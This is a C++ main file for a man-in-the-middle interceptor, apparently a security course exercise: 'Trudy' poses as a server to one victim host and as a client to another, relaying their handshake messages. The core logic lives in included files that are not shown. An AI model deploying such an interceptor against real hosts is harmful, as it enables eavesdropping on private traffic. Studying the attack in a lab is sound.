#include "Server.cpp"
#include "Client.cpp"
#include<iostream>
#include<vector>
#include <netdb.h>

using namespace std;

// complete the get_ip_address function using getaddrinfo
char * get_ip_address(char * server_name) {
    struct addrinfo hints;
    struct addrinfo *res;
    int status;
    char * ip_address = (char *)malloc(16);
    memset(&hints, 0, sizeof (hints));
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_DGRAM;

    if ((status = getaddrinfo(server_name, NULL, &hints, &res)) != 0) {
        fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(status));
        return NULL;
    }

    struct sockaddr_in *ipv4 = (struct sockaddr_in *)res->ai_addr;
    void *addr = &(ipv4->sin_addr);
    inet_ntop(res->ai_family, addr, ip_address, 16);
    return ip_address;
}


void handleFirstVictim (string server_name1, vector<string> & victim1msgs, vector<string> & victim2msgs) {
    Server server = Server(server_name1);
    cout<<"Trudy Server for "<<server_name1<<endl;
    server.listen_to_messages(victim1msgs, victim2msgs);
}

void handleSecondVictim (char * server_ip, string your_name, vector<string> & victim1msgs, vector<string> & victim2msgs) {
    Client client = Client(server_ip, your_name);
    cout<<"Trudy Client for "<<your_name<<" having ip as "<<server_ip<<endl;
    if (client.initiate_handshake()){
        client.initiate_secure_handshake(victim1msgs, victim2msgs);
    }
}



// create a function to initiate the secure handshake

int main(int argc, char *argv[]) {
    if (argc < 4) {
        cout << "Usage: " << argv[0] << " [-m <Hostname> <Hostname>]" << endl;
        return 1;
    }
    char * server_name1 = argv[2];
    char * server_name2 = argv[3];
    string server_ip1;
    string server_ip2;
    // get the ip address of the server from the hostname
    server_ip1 = get_ip_address(server_name1);
    server_ip2 = get_ip_address(server_name2);
    cout << "Intercepting messages from " << server_ip1 << " and " << server_ip2 << endl;

    char * ip1 = (char *)server_ip1.c_str();
    char * ip2 = (char *)server_ip2.c_str();

    if (strcmp(argv[1], "-m") == 0) {

        vector<string> victim1msgs, victim2msgs;
        thread handleFirstVictimThread(handleFirstVictim, server_name1, ref(victim1msgs), ref(victim2msgs));
        thread handleSecondVictimThread(handleSecondVictim, ip2, server_name2, ref(victim1msgs), ref(victim2msgs));
        handleFirstVictimThread.join();
        handleSecondVictimThread.join();
    } else {
        cout << "Usage: " << argv[0] << " [-s] [-c <IP address/Hostname>]" << endl;
        return 1;
    }
}